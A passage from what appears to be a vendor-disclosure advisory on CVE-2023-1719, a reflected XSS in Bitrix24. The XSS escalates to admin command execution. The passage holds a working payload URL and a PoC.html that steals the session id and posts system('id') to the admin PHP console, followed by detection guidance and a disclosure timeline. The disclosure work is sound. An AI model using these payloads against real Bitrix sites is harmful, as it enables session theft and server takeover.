<p>The <code>CUtil::PhpToJSObject</code> function at <code>[4]</code> calls the <code>CUtil::JSEscape</code> function (shown below) on the value of each key-value pair in the <code>$arData</code> array.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/tools.php lines 4349 to 4355
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">JSEscape</span><span class="p">(</span><span class="nv">$s</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="nv">$aSearch</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xe2\x80\xa9</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\xe2\x80\xa8</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;*/&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="nv">$aReplace</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;\\&#34;&#39;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">n&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">n&#34;</span><span class="p">,</span> <span class="s2">&#34;*</span><span class="se">\\</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;</span><span class="se">\\</span><span class="s2">/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$val</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$aSearch</span><span class="p">,</span> <span class="nv">$aReplace</span><span class="p">,</span> <span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This function performs a simple string replacement on the input string <code>$s</code> to ensure that it does not contain any characters that may break out of a JavaScript string, such as <code>&quot;</code>, <code>'</code> or <code>\</code>.</p>
<p>Notably, this function replaces the byte string <code>\xe2\x80\xa9</code> (<a href="https://www.compart.com/en/unicode/U+2029">U+2029 Unicode Paragraph Separator</a>) with a regular space (<a href="https://www.compart.com/en/unicode/U+0020">U+0020 Space</a>).</p>
<p>This is a significant transformation as the Bitrix XSS sanitizer does not regard the byte string <code>\xe2\x80\xa9</code> as whitespace. Therefore, the string <code>onerror\xe2\x80\xa9=</code> would not be sanitized. However, <code>CUtil::JSEscape</code> would transform the string into <code>onerror =</code>, which is a valid HTML <code>onerror</code> event handler.</p>
<p>Therefore, a malicious attacker may craft a <code>log_cnt</code> parameter on <code>get_message_2.php</code>. As <code>onerror\xe2\x80\xa9=</code> does not match the regex for an event handler, the built-in XSS sanitizer does not sanitize this string. When printing <code>$arData</code> in the response, <code>CUtil::JSEscape</code> replaces <code>\xe2\x80\xa9</code> with <code> </code>, resulting in <code>&lt;img src=x onerror =alert(1)&gt;</code> :</p>
<p><img loading="lazy" src="/advisories/23/images/CVE-2023-1719_03.XSS-in-browser.png" alt=""  />
</p>
<h3 id="proof-of-concept-1">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept-1">#</a></h3>
<p>The PoC provided below will execute <code>alert(document.cookie)</code> when visited by unauthenticated users on <code>TARGET_HOST</code>:</p>
<p><code>http://TARGET_HOST/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=%3Cimg%20onerror%E2%80%A9=alert(document.cookie)%20src=1%3E</code></p>
<p>It was discovered that authenticated users can also be targeted by this vulnerability. An attacker can craft a webpage that loads the reflected XSS in an iframe. Since the &ldquo;SameSite&rdquo; attribute of cookies are defaulted to &ldquo;Lax&rdquo;, modern browsers will not send session cookies to webserver when the webpage is loaded inside an iframe, on a cross-origin webpage. In this case, the server will treat the iframed request unauthenticated and return the malicious XSS payload. With a reference to authenticated window (for example, <code>top.opener</code>), malicious JavaScript code can be executed as an authenticated user.</p>
<p>The following <code>PoC.html</code> demonsetrates such attack (<a href="https://drive.google.com/file/d/1DtxLt3mUz6Ci0sk2R8SPnyG3C1vt5E_G/view">demo.mkv</a>). It requires the victim to click on the button to launch attack. If the victim has logged in to Bitrix24 as admin, this PoC will execute shell command <code>id</code> on the webserver and show the command output in an <code>alert</code> popup.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">q</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">),</span> <span class="nx">r</span> <span class="o">=</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">reload</span> <span class="o">=</span> <span class="nx">_</span><span class="p">=&gt;</span> <span class="nx">location</span><span class="p">.</span><span class="nx">search</span> <span class="o">=</span> <span class="nx">q</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">step</span> <span class="o">=</span> <span class="nx">q</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;step&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nx">q</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;step&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">),</span> <span class="nx">r</span> <span class="o">=</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">target</span> <span class="o">=</span> <span class="nx">q</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nx">q</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;target&#39;</span><span class="p">,</span> <span class="s1">&#39;http://10.0.20.40&#39;</span><span class="p">),</span> <span class="nx">r</span> <span class="o">=</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="nx">reload</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">step</span> <span class="o">===</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kd">let</span> <span class="nx">btn</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;button&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">btn</span><span class="p">.</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s1">&#39;run proof-of-concept&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">btn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">btn</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;click&#39;</span><span class="p">,</span> <span class="nx">_</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">q</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;step&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">u</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">location</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u</span><span class="p">.</span><span class="nx">search</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span> <span class="o">+</span> <span class="nx">q</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">u</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">target</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">step</span> <span class="o">===</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kd">let</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="kd">let</span> <span class="nx">ub64payload</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="s1">&#39;`&#39;</span> <span class="o">+</span> <span class="nx">btoa</span><span class="p">(</span><span class="s1">&#39;(&#39;</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;)()&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;`&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">f</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">target</span><span class="si">}</span><span class="sb">/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=%3Cimg%20src=x%20onerror%e2%80%a9=eval(atob(</span><span class="si">${</span><span class="nx">ub64payload</span><span class="si">}</span><span class="sb">))%3E`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">q</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;step&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">reload</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">payload</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kd">let</span> <span class="nx">h</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="kr">async</span> <span class="nx">_</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="kd">with</span><span class="p">(</span><span class="nx">top</span><span class="p">.</span><span class="nx">opener</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">sessid</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/sessid=[a-f0-9]{32}/</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nx">alert</span><span class="p">(</span><span class="kr">await</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;/bitrix/admin/php_command_line.php?lang=en&amp;&#34;</span><span class="o">+</span><span class="nx">sessid</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="nx">method</span><span class="o">:</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="nx">headers</span><span class="o">:</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span>
</span></span><span class="line"><span class="cl">              <span class="p">},</span>
</span></span><span class="line"><span class="cl">              <span class="nx">body</span><span class="o">:</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                <span class="nx">query</span><span class="o">:</span> <span class="sb">`system(&#39;id&#39;);`</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">ajax</span><span class="o">:</span> <span class="s2">&#34;y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="nx">result_as_text</span><span class="o">:</span><span class="s2">&#34;Y&#34;</span>
</span></span><span class="line"><span class="cl">              <span class="p">})</span>
</span></span><span class="line"><span class="cl">            <span class="p">})).</span><span class="nx">text</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="nx">clearInterval</span><span class="p">(</span><span class="nx">h</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span> <span class="mi">500</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span></code></pre></div><h3 id="exploit-conditions-1">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions-1">#</a></h3>
<p>An attacker does not require any permissions to carry out this attack. However, the victim needs to visit a specially crafted URL supplied by the attacker.</p>
<h3 id="detection-guidance-1">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance-1">#</a></h3>
<p>It is possible to detect the exploitation of this vulnerability by checking the server’s access logs for all requests made to <code>/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php</code> with parameter <code>log_cnt</code>. The presence of such request strongly indicates exploitation of this vulnerability.</p>
<h2 id="credits">Credits<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Lam Jun Rong &amp; Li Jiantao of of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-03-17 Initial Vendor Contact via <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a></li>
<li>2023-03-18 No reply from vendor, tried using the form again</li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#95fcfbf3fad5f7fce1e7fcedbbf6faf8"><span class="__cf_email__" data-cfemail="0d64636b624d6f64797f6475236e6260">[email&#160;protected]</span></a></li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#563f3830391667357b343f22243f2e782423"><span class="__cf_email__" data-cfemail="4e272028210e7f2d632c273a3c2736603c3b">[email&#160;protected]</span></a></li>
<li>2023-03-24 Got reply from <a href="/cdn-cgi/l/email-protection#e1888f878ea1d082cc838895938899cf9394"><span class="__cf_email__" data-cfemail="157c7b737a55247638777c61677c6d3b6760">[email&#160;protected]</span></a>, they asked us to email to <a href="/cdn-cgi/l/email-protection#4f262129200f2d263b3d2637612c2022"><span class="__cf_email__" data-cfemail="97fef9f1f8d7f5fee3e5feefb9f4f8fa">[email&#160;protected]</span></a> or use the form at <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a> with regards to the bug reports</li>
<li>2023-03-29 Emailed to [redacted], [redacted] &amp; [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform]</li>
<li>2023-03-30 [redacted] replied to us</li>
<li>2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform]</li>
<li>2023-03-31 Emailed back to [redacted] that we are unable to do so because it&rsquo;s a private program in that [USA bug bounty platform]</li>
<li>2023-03-31 [redacted] emailed back with the invite</li>
<li>2023-03-31 Submitted the reports via that [USA bug bounty platform]</li>
<li>2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements]</li>
<li>2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us</li>
<li>2023-04-04 We submitted the final 2 reports</li>
<li>2023-06-21 [redacted] emailed us &ldquo;Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.&rdquo;</li>
<li>2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date.</li>
<li>2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023</li>
<li>2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023</li>
<li>2023-09-22 [redacted] accepted the date</li>
<li>2023-11-01 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-1718/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-1718) Bitrix24 Denial-of-Service (DoS) via Improper File Stream Access</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-1720/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-1720) Bitrix24 Stored Cross-Site Scripting (XSS) via File Upload</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
